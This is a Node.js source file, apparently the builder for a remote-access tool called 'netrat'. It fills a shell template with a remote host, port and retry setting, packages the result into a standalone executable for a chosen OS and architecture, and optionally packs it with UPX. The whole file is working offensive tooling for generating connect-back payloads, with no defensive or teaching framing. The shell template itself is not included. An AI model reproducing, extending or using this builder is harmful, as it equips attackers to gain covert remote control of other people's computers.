const debug = require('debug')('netrat')
const path = require('path')
const fs = require('fs')
const boxen = require('boxen')
const exec = require('pkg').exec
const upx = require('upx')()
const Mustache = require('mustache')
const SEED_PATH = path.join(__dirname, 'seed', 'shell.mustache')
var OUT_NAME = 'netrat'
var FINAL_DEST = null

var needCompression = true

function builder (opts, destination) {
  // options: {os, rhost, rport, retry, architecture, nodeVersion}
  var stubPath = genStubFromTemplate(SEED_PATH, opts)
  needCompression = opts.compression

  OUT_NAME += (opts.os === 'win') ? '.exe' : ''
  FINAL_DEST = path.join(destination, OUT_NAME)
  var pkgArgs = ['--target', `node${opts.nodeVersion}-${opts.os}-${opts.architecture}`, '--output', FINAL_DEST]
  debug('pkg params:', pkgArgs.join(' '))
  startPkg(stubPath, pkgArgs)
}

function genStubFromTemplate (seedPath, opts) {
  debug('generating stub')
  var seed = fs.readFileSync(seedPath).toString()
  var file = Mustache.render(seed, opts)
  var outPath = path.join(seedPath, '../netrat-shell.js')
  fs.writeFileSync(outPath, file)
  // return path
  return outPath
}

function startPkg (stubPath, args) {
  debug('starting pkg build')
  var input = [stubPath].concat(args)
  exec(input).then(compress).catch(fail)
}

function compress (out) {
  if (out) console.log(out)
  if (needCompression) {
    debug('compression with upx')
    upx(FINAL_DEST).start().then(success).catch(fail)
  } else success()
}

function success (out) {
  debug('pkg build success')
  if (out) debug(out)
  Msg('Build ' + (needCompression ? 'and compression ' : '') + 'succeed!', 0)
}

function fail (err) {
  debug('pkg build failed', err || '')
  Msg('Build failed!', 1)
}

function Msg (text, err) {
  var sym = err ? '\u274c' : '\u2714'
  var color = err ? 'red' : 'green'
  console.log(boxen(`${sym} ${text}`, {padding: 1, margin: 1, align: 'center', borderColor: color}))
}

module.exports = builder
